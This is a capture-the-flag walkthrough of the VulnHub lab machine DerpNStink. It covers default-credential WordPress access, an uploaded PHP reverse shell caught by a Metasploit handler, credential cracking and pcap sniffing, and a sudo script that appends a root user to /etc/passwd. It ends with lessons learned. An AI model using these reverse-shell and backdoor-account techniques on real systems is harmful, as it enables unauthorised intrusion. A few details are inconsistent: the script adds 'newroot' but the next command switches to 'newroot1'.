# DerpNStink: Walkthrough

## Overview
**Machine Name**: DerpNStink<br>
**Platform**: VulnHub<br>
**Difficulty**: Medium<br>
**OS**: Linux (Ubuntu)<br>
**Focus**: WordPress Plugin Exploitation, DB Cracking, FTP Credential Sniffing, PCAP Analysis, Sudo Write Escalation

## Enumeration

### Port Scanning
A full TCP port scan was performed:
```bash
nmap -p- -A -T4 192.168.29.70
```
Open ports list:
| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | ftp | vsftpd 3.0.2 |
| 22/tcp | ssh | OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Protocol 2.0) |
| 80/tcp | http | Apache httpd 2.4.9 |

### Web Enumeration
A search-busting scan of directories on port 80 was launched.
Accessing `/php/phpmyadmin` (default `admin:admin` failed) and `/temporary/index.html` proved to be dead ends:
![](screenshots/Pasted%20image%2020260505201915.png)
![](screenshots/Pasted%20image%2020260505202101.png)

Further directories were discovered after adding `192.168.29.70 derpnstink.local` to the local hosts file:
![](screenshots/Pasted%20image%2020260505212559.png)

A directory named `/weblog` was found running a WordPress instance:
![](screenshots/Pasted%20image%2020260505220007.png)

## Exploitation
### WordPress Slideshow RCE
Logging in to WordPress via `/weblog/wp-login.php` was successful using default credentials `admin:admin`:
![](screenshots/Pasted%20image%2020260505220128.png)

Inside the WordPress admin dashboard, a PHP reverse shell was uploaded using the Slideshow Gallery plugin:
![](screenshots/Pasted%20image%2020260505223056.png)

A Metasploit handler caught the incoming reverse connection:
```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
exploit
```
```bash
whoami
www-data
```

## Privilege Escalation
### Database and FTP Enumeration
Enumerate the WordPress configuration file `wp-config.php`:
```php
define('DB_USER', 'root');
define('DB_PASSWORD', 'mysql');
```

Connecting to the MySQL database allowed dumping user password hashes from the wordpress user tables. 
Cracking the hash for user `stinky` yielded: `stinky` : `wedgie57`.

The user `derp` was found to reuse credentials on FTP. An anonymous/regular FTP connection allowed retrieving a private key `key.txt` and an SSH key folder for user `stinky`. Using `key.txt`, an SSH connection was established directly:
```bash
ssh stinky@192.168.29.70 -i key.txt
```
```bash
whoami
stinky
```

### PCAP Sniffing & Lateral Movement
Inside the home folder of `stinky`, a packet capture file (`derp.pcap`) was discovered. The capture was sent to the host VM using Netcat and opened in Wireshark. 

A credentials analysis of the pcap traffic revealed the password for `mrderp` in plaintext: `derpderpderpderpderpderpderp`.
![](screenshots/Pasted%20image%2020260521211303.png)

Logging in as `mrderp`:
```bash
su mrderp
```

### Sudo Write Privilege Escalation
Checking sudo privileges for `mrderp`:
```bash
sudo -l
```
The configuration allowed `mrderp` to run `/home/mrderp/binaries/derpy.sh` as `root` without a password.

Since `mrderp` owned the folder or could edit the target file, a shell script was created to append a new root user `newroot1` to `/etc/passwd`:
```bash
FILE="/etc/passwd"
LINE="newroot:lMYfwJF/nQvnc:0:0:root:/root:/bin/bash"
echo "$LINE" >> "$FILE"
```

Running the script with sudo permissions:
```bash
sudo ./derpy.sh
su newroot1
whoami
root
```

## Post-Exploitation
### Flag Recovery
- User Flag (Flag 3) located in `stinky`'s Desktop:
  ```bash
  stinky@DeRPnStiNK:~/Desktop$ cat flag.txt
  flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
  ```

## Lessons Learned
1. Enforce strong, non-default passwords for admin logins (e.g., WordPress admin, phpMyAdmin).
2. Avoid credential reuse between different systems and services (database, WordPress, SSH/FTP).
3. Do not run custom scripts owned or editable by standard users via sudo without explicit read-only constraints.
